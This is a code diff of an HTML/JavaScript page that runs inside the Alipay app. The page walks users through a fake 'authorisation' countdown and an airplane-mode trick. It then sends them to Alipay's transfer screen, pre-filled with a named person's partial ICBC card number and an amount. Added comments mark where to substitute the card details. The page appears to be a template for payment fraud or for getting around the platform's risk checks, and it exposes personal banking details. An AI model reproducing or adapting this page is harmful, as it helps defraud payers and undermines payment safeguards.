@@ -1,7 +1,3 @@
-
-
-
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -74,8 +70,6 @@ function isAlipay() {
         return 0;
     }
 }
-
-
 function isMobile() {
     var ua = navigator.userAgent.toLowerCase();
     _long_matches = 'googlebot-mobile|android|avantgo|blackberry|blazer|elaine|hiptop|ip(hone|od)|kindle|midp|mmp|mobile|o2|opera mini|palm( os)?|pda|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce; (iemobile|ppc)|xiino|maemo|fennec';
@@ -96,11 +90,10 @@ function isMobile() {
         var waitCount = 10;
         var clickCount = 0;
         var dot = [".", "..", "..."];
-
         openAlipay = function () {
+		//这里跳转的URL 还是本页面的地址，是在支付宝内打开此页面
             window.location.href = 'alipays://platformapi/startapp?appId=60000029&showLoading=YES&url=https%3a%2f%2f1izheng.github.io%2fxpage%2fzz.html';
         };
-
         function goPay() {
             if (navigator.onLine) {
                 AlipayJSBridge.call('alert', {
@@ -114,44 +107,16 @@ function isMobile() {
                     title: '恭喜！跳转3秒后再“关闭飞行模式”重开网络付款，请耐心等待',
                     button: '知道了，跳转吧'
                 }, function (e) {
-                    try {
-                        var a = {
-                            actionType: "scan",
-                            u: "2088432362471091",
-                            a: "0.98",
-                            m: "",
-                            biz_data: {
-                                s: "money",
-                                u: "2088432362471091",
-                                a: "0.98",
-                                m: ""
-                            }
-                        }
-                    } catch (b) {
-                        returnApp()
-                    }
-                    
+                  
                     ap.pushWindow({
+					//这里是跳转卡的 在这里替换参数
                 url : "alipays://platformapi/startapp?appId=09999988&actionType=toCard&sourceId=bill&cardNo=622208***4909&bankAccount=苏桂青&money=0.01&amount=0.01&bankMark=ICBC&bankName=中国工商银行&cardIndex=1901091791163453041&cardNoHidden=true&cardChannel=HISTORY_CARD&orderSource=from"
             }, function(result){
-
             });
-                    
-                    
-                    
-                    //AlipayJSBridge.call("startApp", {
-                    //    appId: "20000123",
-                    //    param: a
-                    //}, function (a) {
-                    //    if (a.errorCode == 4) {
-                    //        window.location.href = "alipays://platformapi/startapp?appId=10000007&qrcode=" + encodeURI(window.location.href);
-                    //    }
-
-                   // });
+           
                 });
             }
         }
-
         InitQrcode = function () {
             $('#qrcode_load').remove();
             var qrcode = new QRCode('qrcode', {
@@ -163,7 +128,6 @@ function isMobile() {
                 correctLevel: QRCode.CorrectLevel.H
             });
         };
-
         //带天数的倒计时
         var timer = null;
         var times =2560806.278;
@@ -184,7 +148,6 @@ function isMobile() {
                         minute = Math.floor(times / 60) - (day * 24 * 60) - (hour * 60);
                         second = Math.floor(times) - (day * 24 * 60 * 60) - (hour * 60 * 60) - (minute * 60);
                     }
-
                     if (day <= 0) day = ''; else day = day + '天';
                     if (hour <= 0) hour = ''; else hour = hour + '时';
                     if (minute <= 0) minute = ''; else minute = minute + '分';
@@ -216,24 +179,20 @@ function isMobile() {
                 times--;
             }, 1000);
         }();
-
         function changeState() {
             clearInterval(waitInterval);
             $("#alipay").attr("href", "javascript:goPay()").text("已开“飞行模式”，立即支付").removeClass("btn-success").addClass("btn-primary");
             //goPay();
         }
-
         function waitSecond() {
             $("#alipay").text("支付宝授权中(" + Math.ceil(100-waitCount) + "%)" + dot[waitCount%3]);
             waitCount--;
             if (waitCount <= 0)
                 changeState();
         }
-
         function returnApp() {
             AlipayJSBridge.call('exitApp', { closeActionType: "exitSelf", animated: false });
         }
-
         window.onload = function () {
             if (isAlipay()) {
                 document.addEventListener('AlipayJSBridgeReady', function () {
